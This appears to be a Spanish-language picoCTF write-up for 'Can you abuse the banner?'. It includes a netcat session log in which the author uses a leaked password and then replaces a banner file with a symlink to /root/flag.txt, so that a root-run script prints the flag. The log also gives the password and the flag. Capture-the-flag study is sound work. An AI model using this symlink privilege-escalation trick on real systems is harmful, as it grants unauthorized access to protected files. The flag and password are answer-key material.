## Descripción 
Can you abuse the banner?
Additional details will be available after launching your challenge instance.
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 56602`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 50798`. From the above information abuse the machine and find the flag in the /root directory.

Hint:
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing
## Solución 1

Nos conectamos al servidor remoto usando netcat de la dirección y nos da una contraseña, nos conectamos a la segunda dirección y nos pide la contraseña y que contestemos unas preguntas, después de contestarlas accedemos al usuario "player".
Exploramos el sistema de archivos y encontramos que en el directorio /root había un archivo llamado flag.txt, pero no teníamos permisos para leerlo directamente y se leía directamente el banner, entonces borramos el banner y pusimos que leyera directamente el flag.txt y al conectarnos de nuevo al servidos y pedirnos la contraseña, lee el flag.txt en lugar del banner.

```
omarsalazar@DESKTOP-H97NF1C:~$ nc tethys.picoctf.net 62175
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ pwd
pwd
/home/player
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cd ..
cd ..
player@challenge:/$ ls
ls
bin   challenge  etc   lib    media  opt   root  sbin  sys  usr
boot  dev        home  lib64  mnt    proc  run   srv   tmp  var
player@challenge:/$ cd /home/player
cd /home/player
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ car banner
car banner
-su: car: command not found
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ^Z
[6]+  Stopped                 nc tethys.picoctf.net 62175
omarsalazar@DESKTOP-H97NF1C:~$ nc tethys.picoctf.net 62175
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password?
^Z
[7]+  Stopped                 nc tethys.picoctf.net 62175
omarsalazar@DESKTOP-H97NF1C:~$

flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```

## Referencias 
1. https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767#:~:text=A%20symlink%20is%20a%20symbolic,directory%20in%20any%20file%20system.
2. https://www.google.com/search?q=What+is+the+top+cyber+security+conference+in+the+world%3F&rlz=1C1UEAD_esMX1059MX1061&oq=What+is+the+top+cyber+security+conference+in+the+world%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgWGB4yCAgCEAAYFhgeMggIAxAAGBYYHjIICAQQABgWGB4yBwgFEAAY7wUyBwgGEAAY7wUyBwgHEAAY7wUyCggIEAAYgAQYogQyBwgJEAAY7wXSAQc3MjlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8
3. https://www.google.com/search?q=the+first+hacker+ever+was+known+for+phreaking(making+free+phone+calls)%2C+who+was+it%3F&rlz=1C1UEAD_esMX1059MX1061&oq=the+first+hacker+ever+was+known+for+phreaking(making+free+phone+calls)%2C+who+was+it%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABge0gEHNTYwajBqN6gCALACAA&sourceid=chrome&ie=UTF-8